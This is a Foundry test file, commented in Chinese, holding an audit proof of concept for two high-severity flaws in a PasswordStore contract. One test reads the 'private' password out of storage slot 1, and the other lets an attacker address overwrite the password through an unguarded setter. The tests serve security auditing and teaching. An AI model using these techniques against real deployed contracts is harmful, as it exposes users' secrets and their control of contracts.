// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PasswordStore} from "../src/PasswordStore.sol";

/// @notice PasswordStore 两个 High 漏洞的 PoC
contract PasswordStoreAuditPoC is Test {
    PasswordStore store;
    address owner = address(0xA11CE);

    function setUp() public {
        vm.prank(owner);
        store = new PasswordStore();
    }

    // -------------------------------------------------------------------
    // [H-1] "private" 存储不是私密的：任何人都能直接读链上存储槽
    // s_owner 在 slot 0，s_password 在 slot 1。短字符串整存一个槽，
    // 任何链下观察者都能用 eth_getStorageAt(slot 1) 读出明文。
    // -------------------------------------------------------------------
    function test_H1_privatePasswordIsReadableFromStorage() public {
        string memory secret = "mySuperSecretPwd"; // 16 bytes 短字符串
        vm.prank(owner);
        store.setPassword(secret);

        // 任何人(这里不需要任何权限/调用合约)直接读 slot 1
        bytes32 slot1 = vm.load(address(store), bytes32(uint256(1)));

        // 从槽里还原短字符串：高位是数据，最低字节 = length*2
        uint256 len = uint256(uint8(uint256(slot1))) / 2;
        bytes memory out = new bytes(len);
        for (uint256 i = 0; i < len; i++) {
            out[i] = slot1[i];
        }
        string memory recovered = string(out);

        emit log_named_string("recovered from storage", recovered);
        assertEq(recovered, secret, "anyone can read the 'private' password from storage");
    }

    // -------------------------------------------------------------------
    // [H-2] setPassword 没有访问控制：非 owner 也能改密码
    // NatSpec 声称"only the owner"，但函数体没有任何 owner 校验。
    // -------------------------------------------------------------------
    function test_H2_anyoneCanSetPassword() public {
        vm.prank(owner);
        store.setPassword("ownerSecret");

        address attacker = address(0xBAD);
        vm.prank(attacker);
        store.setPassword("pwned_by_attacker"); // 应当失败，实际成功

        vm.prank(owner);
        assertEq(store.getPassword(), "pwned_by_attacker", "attacker overwrote the password");
    }
}
